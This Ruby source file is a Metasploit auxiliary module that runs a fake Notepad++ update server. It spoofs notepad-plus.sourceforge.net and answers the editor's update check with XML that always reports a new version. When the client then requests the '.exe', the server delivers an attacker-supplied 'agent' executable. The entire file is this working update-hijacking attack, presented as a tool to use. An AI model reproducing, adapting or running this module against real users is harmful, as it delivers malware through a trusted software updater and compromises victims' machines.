require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Update
	def initialize
		super(
			'Name'        => 'Fake NotepadPlus Updater',
			'Version'     => '1.0',
			'Description'    => %q{
				This module provides a HTTP service that
			is designed to fake NotepadPlus updates.
			},
			'Author'      => ['spider'],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
			], self.class)

			@base = {
			'vh' => ['notepad-plus.sourceforge.net'],
			'request' => [{
				'req' => 'getDownLoadUrl.php', 
				'type' => 'string', 
				'method' => '', 
				'bin'    => '0',
				'string' => "<?xml version=\"1.0\"?>\n<GUP>\n\t<NeedToBeUpdated>yes</NeedToBeUpdated>\n\t<Version>1<%RND1%>.0.0</Version>\n\t<Location>http://notepad-plus.sourceforge.net/<%RND2%>.exe</Location>\n</GUP>",
				'parse' => 1,
				'file' => '',
			},
			{
				'req' => '.exe',
				'type' => 'agent',
				'method' => '',
				'bin'    => 1,
				'string' => '',
				'parse' => '0',
				'file' => ''
			}
			],
			'options' => {  
				'rnd1'  => { 'val' => 'RndNum(2)',
				'hidden' => 1,
				'dynamic' =>1,
				},
				'rnd2'  => { 'val' => 'RndAlpha(rand(9))',
				'hidden' => 1,
				'dynamic' =>1,
				}
			}
		}
	end
end
